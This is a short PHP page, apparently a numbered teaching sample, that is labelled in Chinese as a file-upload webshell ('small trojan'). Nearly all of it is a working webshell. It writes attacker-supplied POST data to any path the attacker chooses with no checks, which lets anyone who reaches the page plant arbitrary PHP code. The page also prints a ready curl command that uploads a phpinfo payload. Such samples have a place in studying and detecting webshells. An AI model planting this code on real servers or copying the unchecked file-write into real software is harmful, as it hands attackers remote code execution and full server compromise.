<?php
    error_reporting(E_ALL);
    ini_set("display_errors", 1);
?>

<html>
<head>	
	<meta charset="UTF-8"/>
	<title>015 - WebShell - 文件上传小马</title>
</head>
<body>
<h1>015 - WebShell - 文件上传小马</h1>

<p>不正常调用：</p>
<pre>curl -g <?php echo 'http://'.$_SERVER['HTTP_HOST'].parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH).' -d "path=1.php&data=&lt;?php phpinfo(); ?>"'?></pre>

<?php 
	if (isset ($_POST['path']) && isset ($_POST['data']))
	{
		file_put_contents($_POST['path'], $_POST['data']);
	}
?>
</body>
</html>
